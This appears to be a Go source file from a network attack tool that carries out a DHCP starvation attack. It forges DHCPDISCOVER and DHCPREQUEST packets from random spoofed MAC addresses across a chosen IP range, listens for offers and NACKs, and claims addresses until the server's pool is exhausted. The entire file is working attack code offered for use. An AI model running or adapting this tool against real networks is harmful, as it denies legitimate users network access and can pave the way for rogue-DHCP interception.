package main

import (
	crand "crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/pterm/pterm"
)

type DHCPStarvation struct {
	handle        *pcap.Handle
	pktsrc        *gopacket.PacketSource
	iface         *net.Interface
	MAC           net.HardwareAddr
	server        net.IP
	start         net.IP
	end           net.IP
	offredIP      net.IP
	hosts         []net.IP
	EthernetLayer *layers.Ethernet
	IPLayer       *layers.IPv4
	UDPLayer      *layers.UDP
}

func NewDHCPStarvation(iface *net.Interface, server net.IP, start net.IP, end net.IP) (*DHCPStarvation, error) {
	handle, err := pcap.OpenLive(iface.Name, 65536, true, time.Second*3)
	if err != nil {
		return &DHCPStarvation{}, err
	}
	return &DHCPStarvation{handle: handle, pktsrc: gopacket.NewPacketSource(handle, layers.LayerTypeEthernet),
		iface: iface, server: server, start: start, end: end}, nil
}

func (d *DHCPStarvation) SendDHCPDiscover(xid uint32) {
	d.EthernetLayer = &layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       d.MAC,
		DstMAC:       layers.EthernetBroadcast,
	}

	d.IPLayer = &layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    []byte{0, 0, 0, 0},
		DstIP:    []byte{255, 255, 255, 255},
		Protocol: layers.IPProtocolUDP,
	}

	d.UDPLayer = &layers.UDP{
		SrcPort: 68,
		DstPort: layers.UDPPort(67),
	}

	DHCPLayerRequest := layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		ClientHWAddr: d.MAC,
		Xid:          xid,
	}

	if d.server != nil {
		DHCPLayerRequest.NextServerIP = d.server
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	d.AppendOption(&DHCPLayerRequest, layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeDiscover)})
	d.AppendOption(&DHCPLayerRequest, layers.DHCPOptHostname, []byte(fmt.Sprintf("%v-th3x0ne.com", xid)))
	d.AppendOption(&DHCPLayerRequest, layers.DHCPOptParamsRequest,
		[]byte{
			1,  // Subnet Mask
			3,  // Router
			6,  // Domain Name Server
			26, // Interface MTU
			42, // Network Time Protocol Servers
			28, // Broadcast
		},
	)

	d.UDPLayer.SetNetworkLayerForChecksum(d.IPLayer)

	check(gopacket.SerializeLayers(buf, opts, d.EthernetLayer, d.IPLayer, d.UDPLayer, &DHCPLayerRequest))
	data := buf.Bytes()

	if Verbose {
		fmt.Printf("%v Sending %v (%s bytes):\n"+
			"\t%10s: %16s - %10s: %16s\n"+
			"\t%10s : %16s - %10s: %16s\n\n",
			pterm.Blue("•••"), pterm.LightCyan("DHCPDISCOVER"), pterm.Green(len(data)),
			pterm.FgMagenta.Sprintf("SourceMAC"), pterm.Yellow(d.EthernetLayer.SrcMAC),
			pterm.FgMagenta.Sprintf("DestMAC"), pterm.Yellow(d.EthernetLayer.DstMAC),
			pterm.FgMagenta.Sprintf("SourceIP"), pterm.Yellow(d.IPLayer.SrcIP),
			pterm.FgMagenta.Sprintf("DestIP"), pterm.Yellow(d.IPLayer.DstIP))
	}

	check(d.handle.WritePacketData(data))
}

func (d *DHCPStarvation) WaitForDHCPOffer(sp *pterm.SpinnerPrinter) bool {

	start := time.Now()

	for dp := range d.pktsrc.Packets() {

		// fmt.Println(time.Since(start).Seconds())
		// wait for 3 seconds, if no OFFER packet receieved, that means maybe no free leases
		if now := time.Since(start); now.Seconds() > float64(3) {
			// Breaking
			break
		}

		if DHCPLayer := dp.Layer(layers.LayerTypeDHCPv4); DHCPLayer != nil {
			DHCPResponse := DHCPLayer.(*layers.DHCPv4)

			// check if DHCPOFFER MESSAGE
			if int(DHCPResponse.Options[0].Data[0]) == 2 {

				// sp.UpdateText(fmt.Sprintf("Recieved DHCPOFFER (%d bytes)...", len(dp.Data())))
				// fmt.Printf("\n*** Recieved DHCPOFFER (%d bytes):\n", len(dp.Data()))

				// extract Ethernet Layer
				EthernetLayer := dp.Layer(layers.LayerTypeEthernet)
				Ethernet := EthernetLayer.(*layers.Ethernet)

				// extract IP Layer
				IPv4Layer := dp.Layer(layers.LayerTypeIPv4)
				IPv4 := IPv4Layer.(*layers.IPv4)

				// as we will use concurrency we will have other DHCP Responses in the same time,
				// so we are verifying that response is ours or NOT
				// fmt.Println(d.offredIP.To4(), IPv4.DstIP.To4(), net.IP.Equal(d.offredIP.To4(), IPv4.DstIP.To4()))
				// if equal := net.IP.Equal(d.offredIP.To4(), DHCPResponse.YourClientIP.To4()); !equal {
				// 	fmt.Println("false continue")
				// 	continue
				// }

				if Verbose {
					fmt.Printf("%v Recieved %v (%s bytes):\n"+
						"\t%10s: %16s - %10s: %16s\n"+
						"\t%10s : %16s - %10s: %16s\n",
						pterm.Green("•••"), pterm.LightCyan("DHCPOFFER"), pterm.Green(len(dp.Data())),
						pterm.FgMagenta.Sprintf("SourceMAC"), pterm.Yellow(Ethernet.SrcMAC),
						pterm.FgMagenta.Sprintf("DestMAC"), pterm.Yellow(Ethernet.DstMAC),
						pterm.FgMagenta.Sprintf("SourceIP"), pterm.Yellow(IPv4.SrcIP),
						pterm.FgMagenta.Sprintf("DestIP"), pterm.Yellow(IPv4.DstIP))
				}

				if d.offredIP == nil {
					d.offredIP = DHCPResponse.YourClientIP
				}

				// set Server ID for next Request
				d.server = IPv4.SrcIP

				if Verbose {
					var message []string

					message = append(message, fmt.Sprintf("\t%s: %s\n", pterm.FgBlue.Sprintf("Offered IP"), pterm.Green(DHCPResponse.YourClientIP)))

					for _, opt := range DHCPResponse.Options {
						if int(opt.Type) != 53 {
							switch int(opt.Type) {
							case 1, 54, 28, 3, 6, 42:
								message = append(message, fmt.Sprintf("\t%v(%v)  : %s\n", pterm.FgBlue.Sprintf(opt.Type.String()),
									pterm.Yellow(strconv.Itoa(int(opt.Type))), pterm.Green(net.IP(opt.Data))))

							case 51, 58, 59:
								if len(opt.Data) != 4 {
									message = append(message, fmt.Sprintf("\t%s : %s\n", pterm.FgBlue.Sprintf(opt.Type.String()),
										pterm.FgRed.Sprintf("INVALID")))
								}
								message = append(message, fmt.Sprintf("\t%v(%v)  : %s\n",
									pterm.FgBlue.Sprintf(opt.Type.String()), pterm.Yellow(strconv.Itoa(int(opt.Type))),
									pterm.Green(uint32(opt.Data[0])<<24|uint32(opt.Data[1])<<16|uint32(opt.Data[2])<<8|uint32(opt.Data[3]))))
							case 119, 47, 15:
								message = append(message, fmt.Sprintf("\t%v(%v) : %s\n", pterm.FgBlue.Sprintf(opt.Type.String()),
									pterm.Yellow(strconv.Itoa(int(opt.Type))), string(opt.Data)))
							default:
								message = append(message, fmt.Sprintf("\t%v(%v) : %v\n", pterm.FgBlue.Sprintf(opt.Type.String()),
									pterm.Yellow(strconv.Itoa(int(opt.Type))), pterm.Green(opt.Data)))
							}
						}

					}

					fmt.Println(strings.Join(message, " "))
				}

				return true
			}
		}

	}
	return false
}

func (d DHCPStarvation) SendDHCPRequest(xid uint32) {
	DHCPLayerReply := layers.DHCPv4{
		Operation:    layers.DHCPOpReply,
		HardwareType: layers.LinkTypeEthernet,
		ClientHWAddr: d.MAC,
		Xid:          xid,
	}

	if d.offredIP != nil {
		DHCPLayerReply.ClientIP = d.offredIP
	}

	if d.server != nil {
		DHCPLayerReply.NextServerIP = d.server
	}

	d.AppendOption(&DHCPLayerReply, layers.DHCPOptMessageType, []byte{byte(layers.DHCPMsgTypeRequest)})
	d.UDPLayer.SetNetworkLayerForChecksum(d.IPLayer)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	check(gopacket.SerializeLayers(buf, opts, d.EthernetLayer, d.IPLayer, d.UDPLayer, &DHCPLayerReply))
	data := buf.Bytes()

	if Verbose {
		fmt.Printf("%v Sending %v (%s bytes):\n"+
			"\t%10s: %16s - %10s: %16s\n"+
			"\t%10s : %16s - %10s: %16s\n\n",
			pterm.Blue("•••"), pterm.LightCyan("DHCPREQUEST"), pterm.Green(len(data)),
			pterm.FgMagenta.Sprintf("SourceMAC"), pterm.Yellow(d.EthernetLayer.SrcMAC),
			pterm.FgMagenta.Sprintf("DestMAC"), pterm.Yellow(d.EthernetLayer.DstMAC),
			pterm.FgMagenta.Sprintf("SourceIP"), pterm.Yellow(d.IPLayer.SrcIP),
			pterm.FgMagenta.Sprintf("DestIP"), pterm.Yellow(d.IPLayer.DstIP))
	}

	check(d.handle.WritePacketData(data))
}

func (d *DHCPStarvation) WaitForDHCPNACK() (string, bool) {

	// set timeout
	start := time.Now()

	for dp := range d.pktsrc.Packets() {

		// fmt.Println(time.Since(start).Seconds())
		// wait for 3 seconds, if no NACK packet receieved, that means IP starved Successfully
		if now := time.Since(start); now.Seconds() > float64(3) {
			// Breaking
			return "", true
		}

		if DHCPLayer := dp.Layer(layers.LayerTypeDHCPv4); DHCPLayer != nil {

			// extract DHCPLayer
			DHCPResponse := DHCPLayer.(*layers.DHCPv4)

			// check if DHCPNACK MESSAGE
			if int(DHCPResponse.Options[0].Data[0]) == 6 {

				// extract Ethernet Layer
				EthernetLayer := dp.Layer(layers.LayerTypeEthernet)
				Ethernet := EthernetLayer.(*layers.Ethernet)

				// extract IP Layer
				IPv4Layer := dp.Layer(layers.LayerTypeIPv4)
				IPv4 := IPv4Layer.(*layers.IPv4)

				if Verbose {
					fmt.Printf("%v Recieved %v (%s bytes):\n"+
						"\t%10s: %16s - %10s: %16s\n"+
						"\t%10s : %16s - %10s: %16s\n\n",
						pterm.Yellow("•••"), pterm.LightCyan("DHCPNACK"), pterm.Green(len(dp.Data())),
						pterm.FgMagenta.Sprintf("SourceMAC"), pterm.Yellow(Ethernet.SrcMAC),
						pterm.FgMagenta.Sprintf("DestMAC"), pterm.Yellow(Ethernet.DstMAC),
						pterm.FgMagenta.Sprintf("SourceIP"), pterm.Yellow(IPv4.SrcIP),
						pterm.FgMagenta.Sprintf("DestIP"), pterm.Yellow(IPv4.DstIP))
				}

				for _, opt := range DHCPResponse.Options {
					// Looking for Message Only
					if int(opt.Type) == 56 {
						// fmt.Printf("\t%v: %s\n", opt.Type, string(opt.Data))
						return string(opt.Data), false
					}
				}
			}
		}
	}
	return "", true
}

func (d *DHCPStarvation) GenerateMAC() {
	var buffer []byte = make([]byte, 6)
	var MAC net.HardwareAddr

	_, err := crand.Read(buffer)
	if err != nil {
		pterm.Error.Println("Unable to generate New MAC Address !")
		pterm.Println()
		os.Exit(-1)
	}

	buffer[0] |= 2
	d.MAC = append(MAC, buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5])
}

func (d DHCPStarvation) AppendOption(DHCPLayer *layers.DHCPv4, optType layers.DHCPOpt, data []byte) {
	DHCPLayer.Options = append(DHCPLayer.Options, layers.DHCPOption{
		Type:   optType,
		Data:   data,
		Length: uint8(len(data)),
	})
}

func (d *DHCPStarvation) Hosts() error {
	if isNotLess := IPLess(d.start, d.end); isNotLess {
		network := 0
		for {
			host := d.IPAdd(network)
			network++
			d.hosts = append(d.hosts, host)
			if isEqual := d.end.Equal(host); isEqual {
				break
			}
		}
		return nil
	}
	return fmt.Errorf("can't Accept Values - start: %v - end: %v \n- Available hosts in this range %v <= 0",
		pterm.LightYellow(d.start), pterm.LightYellow(d.end), pterm.LightYellow(d.IPRangeCount()))
}

// IPRange returns how many ips in the ip range from start to stop (inclusive)
func (d *DHCPStarvation) IPRangeCount() int {
	return int(binary.BigEndian.Uint32(d.end.To4())) - int(binary.BigEndian.Uint32(d.start.To4()))
}

// IPAdd returns a copy of start + add.
// IPAdd(net.IP{192,168,1,1},30) returns net.IP{192.168.1.31}
func (d *DHCPStarvation) IPAdd(add int) (result net.IP) { // IPv4 only
	start := d.start.To4()
	result = make(net.IP, 4)
	binary.BigEndian.PutUint32(result, binary.BigEndian.Uint32(start)+uint32(add))
	return
}

// IPLess returns where IP a is less than IP b.
func IPLess(a, b net.IP) bool {
	b = b.To4()
	for i, ai := range a.To4() {
		if ai != b[i] {
			return ai < b[i]
		}
	}
	return false
}

// IPInRange returns true if ip is between (inclusive) start and stop.
func IPInRange(start, stop, ip net.IP) bool {
	if start != nil && stop != nil {
		return !(IPLess(ip, start) || IPLess(stop, ip))
	}
	return true
}
